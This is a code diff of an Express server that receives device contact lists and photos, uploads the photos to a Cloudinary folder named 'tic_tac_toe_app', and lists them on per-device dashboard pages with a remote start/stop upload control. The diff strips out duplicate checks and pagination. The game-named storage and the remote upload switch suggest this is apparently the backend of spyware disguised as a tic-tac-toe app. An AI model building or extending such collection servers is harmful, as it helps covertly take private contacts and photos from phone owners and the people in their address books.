@@ -34,8 +34,7 @@ async function initDB() {
       id SERIAL PRIMARY KEY,
       device_id TEXT,
       image_url TEXT,
-      cloudinary_public_id TEXT,
-      original_filename TEXT
+      cloudinary_public_id TEXT
     );
 
     CREATE TABLE IF NOT EXISTS contacts (
@@ -50,21 +49,9 @@ async function initDB() {
     );
   `);
 
-  // Add columns if they don't exist (for existing DBs)
-  await pool.query(`ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;`);
-  await pool.query(`ALTER TABLE images ADD COLUMN IF NOT EXISTS original_filename TEXT;`);
-
-  // ✅ Add unique constraint on contacts so server rejects duplicates at DB level
+  // Add cloudinary_public_id column if it doesn't exist (for existing DBs)
   await pool.query(`
-    CREATE UNIQUE INDEX IF NOT EXISTS contacts_device_contact_unique
-    ON contacts (device_id, contact);
-  `);
-
-  // ✅ Add unique constraint on images filename per device so same file never saved twice
-  await pool.query(`
-    CREATE UNIQUE INDEX IF NOT EXISTS images_device_filename_unique
-    ON images (device_id, original_filename)
-    WHERE original_filename IS NOT NULL;
+    ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;
   `);
 }
 initDB();
@@ -425,23 +412,16 @@ app.get("/", async (req, res) => {
 // ================= RECEIVE CONTACTS =================
 app.post("/receive", async (req, res) => {
   const { device_id, data } = req.body;
-  let inserted = 0;
-  let skipped = 0;
   for (let contact of data) {
-    // ✅ ON CONFLICT DO NOTHING prevents duplicate contacts for same device
-    const result = await pool.query(
-      `INSERT INTO contacts (device_id, contact) VALUES ($1, $2)
-       ON CONFLICT (device_id, contact) DO NOTHING`,
+    await pool.query(
+      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
       [device_id, contact]
     );
-    if (result.rowCount > 0) inserted++;
-    else skipped++;
   }
   await pool.query(
     "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
     [device_id]
   );
-  console.log(`Contacts: ${inserted} inserted, ${skipped} skipped (duplicates) for device ${device_id}`);
   res.send("Contacts saved ✅");
 });
 
@@ -449,21 +429,6 @@ app.post("/receive", async (req, res) => {
 app.post("/upload-image", upload.single("image"), async (req, res) => {
   try {
     const device_id = req.body.device_id;
-    const originalFilename = req.file.originalname || null;
-
-    // ✅ Check if this exact filename was already uploaded for this device
-    //    This is a second safety net (first net is SharedPreferences on the Android side)
-    if (originalFilename) {
-      const existing = await pool.query(
-        "SELECT id FROM images WHERE device_id=$1 AND original_filename=$2",
-        [device_id, originalFilename]
-      );
-      if (existing.rows.length > 0) {
-        console.log(`Duplicate image skipped: ${originalFilename} for device ${device_id}`);
-        return res.json({ skipped: true, reason: "duplicate" });
-      }
-    }
-
     const stream = cloudinary.uploader.upload_stream(
       { folder: "tic_tac_toe_app" },
       async (error, result) => {
@@ -471,8 +436,8 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
         const imageUrl = result.secure_url;
         const publicId = result.public_id;
         await pool.query(
-          "INSERT INTO images (device_id, image_url, cloudinary_public_id, original_filename) VALUES ($1, $2, $3, $4)",
-          [device_id, imageUrl, publicId, originalFilename]
+          "INSERT INTO images (device_id, image_url, cloudinary_public_id) VALUES ($1, $2, $3)",
+          [device_id, imageUrl, publicId]
         );
         await pool.query(
           "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
@@ -789,23 +754,13 @@ app.get("/user/:device_id/contacts", async (req, res) => {
   `);
 });
 
-// ================= USER IMAGES (with Start/Stop + Delete + Pagination) =================
+// ================= USER IMAGES (with Start/Stop + Delete) =================
 app.get("/user/:device_id/images", async (req, res) => {
   const device = req.params.device_id;
-  const PAGE_SIZE = 50;
-  const page = Math.max(1, parseInt(req.query.page) || 1);
-  const offset = (page - 1) * PAGE_SIZE;
-
-  const totalResult = await pool.query(
-    "SELECT COUNT(*) FROM images WHERE device_id=$1",
-    [device]
-  );
-  const totalImages = parseInt(totalResult.rows[0].count);
-  const totalPages = Math.ceil(totalImages / PAGE_SIZE);
 
   const images = await pool.query(
-    "SELECT * FROM images WHERE device_id=$1 ORDER BY id DESC LIMIT $2 OFFSET $3",
-    [device, PAGE_SIZE, offset]
+    "SELECT * FROM images WHERE device_id=$1 ORDER BY id DESC",
+    [device]
   );
 
   const controlRow = await pool.query(
@@ -828,27 +783,6 @@ app.get("/user/:device_id/images", async (req, res) => {
       </div>
     `;
   });
-
-  // Build pagination controls
-  let paginationHtml = "";
-  if (totalPages > 1) {
-    paginationHtml = `<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:20px;">`;
-    if (page > 1) {
-      paginationHtml += `<a href="/user/${device}/images?page=${page - 1}" class="btn btn-secondary" style="font-size:13px;padding:7px 14px;">&larr; Prev</a>`;
-    }
-    for (let p = 1; p <= totalPages; p++) {
-      if (p === page) {
-        paginationHtml += `<span style="padding:7px 14px;border-radius:8px;background:#1e2d4a;color:#f1f5f9;font-size:13px;font-weight:700;">${p}</span>`;
-      } else {
-        paginationHtml += `<a href="/user/${device}/images?page=${p}" class="btn btn-secondary" style="font-size:13px;padding:7px 14px;">${p}</a>`;
-      }
-    }
-    if (page < totalPages) {
-      paginationHtml += `<a href="/user/${device}/images?page=${page + 1}" class="btn btn-secondary" style="font-size:13px;padding:7px 14px;">Next &rarr;</a>`;
-    }
-    paginationHtml += `<span style="color:#64748b;font-size:13px;margin-left:8px;">Page ${page} of ${totalPages} &bull; ${totalImages} total</span>`;
-    paginationHtml += `</div>`;
-  }
 
   const statusBadge = isUploading
     ? `<span class="status-badge-on"><span class="pulse"></span> Uploading Active</span>`
@@ -900,7 +834,7 @@ app.get("/user/:device_id/images", async (req, res) => {
       <div class="card">
         <h3 style="flex-wrap:wrap; gap:10px;">
           &#128247; Received Images
-          <span class="count-badge">${totalImages}</span>
+          <span class="count-badge">${images.rows.length}</span>
           <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
             <button class="btn btn-red" style="font-size:13px; padding:8px 14px;"
               onclick="confirmDeleteSelectedImages()">
@@ -928,8 +862,6 @@ app.get("/user/:device_id/images", async (req, res) => {
             </div>
           </form>
         ` : '<div class="empty-state">No images uploaded yet.</div>'}
-
-        ${paginationHtml}
 
         <!-- Delete All Images form (hidden) -->
         <form id="deleteAllImgsForm" method="POST" action="/delete-all-images/${device}" style="display:none;"></form>
@@ -965,7 +897,7 @@ app.get("/user/:device_id/images", async (req, res) => {
       }
       function confirmDeleteAllImages() {
         document.getElementById('deleteImagesMsg').textContent =
-          'Delete ALL ${totalImages} images? They will be permanently removed from Cloudinary.';
+          'Delete ALL ${images.rows.length} images? They will be permanently removed from Cloudinary.';
         document.getElementById('deleteImagesModal').classList.add('open');
         document.getElementById('deleteImagesModal').dataset.deleteAll = 'true';
       }
